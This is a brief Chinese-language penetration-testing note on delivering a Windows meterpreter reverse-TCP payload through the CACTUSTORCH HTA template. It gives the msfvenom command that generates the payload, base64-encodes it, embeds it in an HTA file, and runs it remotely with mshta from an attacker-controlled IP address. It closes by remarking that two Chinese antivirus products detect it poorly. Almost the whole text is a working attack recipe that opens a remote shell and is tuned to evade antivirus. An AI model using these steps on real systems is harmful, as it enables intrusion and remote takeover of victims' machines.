	https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta
	生成
	>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin
	>cat 1.bin |base64 -w 0
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/75.png)

	编码后的内容复制到
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/76.png)

	执行
	>mshta http://192.168.0.106:1222/1.hta
	360执行检测出来，静态动态无法检测、火绒无法检测